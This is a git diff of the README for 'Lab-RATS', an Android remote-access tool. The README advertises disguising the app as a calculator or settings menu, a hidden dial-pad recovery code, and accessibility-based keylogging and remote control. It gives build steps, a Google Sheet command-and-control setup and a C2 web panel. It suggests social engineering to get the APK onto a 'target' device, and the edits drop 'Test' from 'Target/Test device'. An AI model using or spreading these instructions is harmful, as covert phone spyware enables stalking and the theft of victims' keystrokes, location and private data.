@@ -24,7 +24,7 @@
 
 ## 🕵️ Covert & Stealth Operations
 
--   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Update**, or **Settings** menu.
+-   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Diagnostics**, or **Settings** menu.
 -   🛠️ **Functional Decoy Engine**: Unlike static images, these decoys are **fully interactive**. The Calculator performs real math, and the Weather app dynamically loads the target's actual city name and forecast.
 -   🩹 **Self-Healing Protocol**: Automatically detects and repairs damaged service bindings or revoked permissions in the background.
 -   ☎️ **Dial-Pad Recovery**: If the launcher icon is hidden or replaced, **dial `*#1337#` on the phone's keypad** to instantly restore the Lab-RATS dashboard.
@@ -76,24 +76,24 @@
 
 ### 1. Requirements
 *   **Java 11 or 21** installed on your **workstation**.
-*   A **target Android** device *(Rootless Samsung/Pixel/OnePlus supported)*.
+*   📱 A **target Android** device *(Rootless Samsung/Pixel/OnePlus supported)*.
 *   A **Google Sheet Webhook URL** for IP tracking.
 
 ### 2. Build the APK (on PC)
 1.  **Download & Extract** the repository.
 2.  Navigate to `cd /Lab-RATS-main/app-builder/`
-3.  Execute the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
-4.  Enter your **App Name** and **Google Sheet URL**. *(Google Sheet Setup instructions Below)*
-5.  Retrieve your `signed.apk` from the `/app-builder/output/` directory.
+3.  **Execute** the builder: chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
+4.  Enter your **App Name** and **Google Sheet URL**. *(Google Sheet Setup Instructions Below)*
+4.  Retrieve your `signed.apk` from the `/app-builder/output/` directory.
 
-### 3. Install App on Target/Test Device
-1.  Install the `signed.apk` onto the **Target/Test Android device**.
+### 3. Install APK on Target Device
+1.  **Install** the `signed.apk` onto the **Target Android device**.
 
-> Info - *If you have access to the device, turn on USB debugging (developer settings), plug it into a PC and run `adb install signed.apk`. Otherwise get creative on how to install Android `.apk` files onto devices.(Social Engineering?, E-mailing to Target?, Hosting App on Website/Server?)*
+> Info - *If you have access to the device, turn on USB debugging (developer settings), plug it into a PC and run `adb install signed.apk`. Otherwise get creative on how to install Android `.apk` files onto devices.(Social Engineering?, Hosting App on Website/Server?)*
 
-2.  Once the app is installed onto the **Target/Test Device**, **ALL permissions must be granted on device**, then tap the **"Initialize Server"** button.
+2.  Once the app is installed onto the **Target Device**, **ALL permissions must be granted on device**, then tap the **"Initialize Server"** button.
 3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
-4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target/Test device**.
+4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target device**.
 
 > Info - *To use the Ghost features navigate to the "Ghost Tab" in the Web Control(C2) Panel and click the "Open Accessibility Settings" button. This opens a page on the device, tap "Installed Apps" and grant access to full control of device. - Images Below* ** *(This only applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". All other features can be used without this permission)*
 
@@ -104,7 +104,7 @@
 
 ---
 
-## 📊 Google Sheet C2 Setup (Advanced v1.4)
+## 📊 Google Sheet C2 Setup Instructions (Advanced v1.4)
 
 1.  **Create** a new **Google Sheet**.
 2.  Go to **Extensions** → **Apps Script** and paste **this Snippet**:
@@ -135,9 +135,9 @@ function doPost(e) {
 }
 ```
 3.  **Deploy** → **Web App** → **Execute as Me** → **Access Anyone**.
-4.  **Paste** the **Generated URL** into the **APK Builder** when prompted.
+4.  **Paste** the **Generated URL** into the **apk-builder** when prompted.
 
-### 📊 Example Google Sheet Running:
+### 📊 Example Google Sheet Configured:
 
 [![Google-Sheet-Example.png](https://i.postimg.cc/L6qYMSZr/Google-Sheet-Example.png)](https://postimg.cc/56VNwZg3)
 
@@ -147,7 +147,8 @@ function doPost(e) {
 
 If you find **Lab-RATS** useful for your **security research**, **please Star ⭐ the project**—it drives **further development**!
 
-**Contributions**: **Bug reports, feature** and **pull requests** are **always welcome**.
+### Contributions:
+**Bug reports, feature** and **pull requests** are **always welcome**.
 
 **Donations (Optional)**:
 
@@ -158,11 +159,12 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ---
 
-## 📸 Screenshots
+## 📸 Screenshots/Videos
 
-
-### **The App/APK Building Tool in Terminal**
-[![APK-builder-pic.jpg](https://i.postimg.cc/2yPsdzKN/APK-builder-pic.jpg)](https://postimg.cc/64fbtNKM)
+### **The APK Builder Tool in Terminal** (Advanced v1.4)
+> This build excludes my Google Sheet Webhook URL for security. For private builds, you must add your own Google webhook URL to correctly receive the IPv6 address from the app after installation.
+  
+https://github.com/user-attachments/assets/8e4ccb39-3fd5-400f-befa-f499d5ee54f9
 
 ---
 
@@ -184,9 +186,9 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ---
 
-## 📱 Remote Web Control (C2) Panel - PC Interface
+## Remote Web Control (C2) Panel - PC Interface
 
-### **C2 Panel Video Clip:**
+### **C2 Panel Video:**
 
 https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 
@@ -282,6 +284,7 @@ https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 
 ## 📱 Remote Web Control (C2) Panel - Mobile Interface *(A Few Examples)*
 
+<p align="center">
 <a href="https://postimg.cc/nXZxpmhT" target="_blank"><img src="https://i.postimg.cc/nXZxpmhT/Lab-RATS-Mobile-C2-Home.jpg" alt="Lab-RATS-Mobile-C2-Home"></a> <a href="https://postimg.cc/dhvFwCVB" target="_blank"><img src="https://i.postimg.cc/dhvFwCVB/Lab-Rats-Mobile-C2-Ghost1.jpg" alt="Lab-Rats-Mobile-C2-Ghost1"></a> <a href="https://postimg.cc/HrHmdMk9" target="_blank"><img src="https://i.postimg.cc/HrHmdMk9/Lab-RATS-Mobile-C2-Ghost2.jpg" alt="Lab-RATS-Mobile-C2-Ghost2"></a> <a href="https://postimg.cc/cvZW03Lk" target="_blank"><img src="https://i.postimg.cc/cvZW03Lk/Lab-RATS-Mobile-C2-Optics.jpg" alt="Lab-RATS-Mobile-C2-Optics"></a> <a href="https://postimg.cc/jDKTtfSZ" target="_blank"><img src="https://i.postimg.cc/jDKTtfSZ/Lab-RATS-Mobile-C2-GPS.jpg" alt="Lab-RATS-Mobile-C2-GPS"></a>
 
 ---
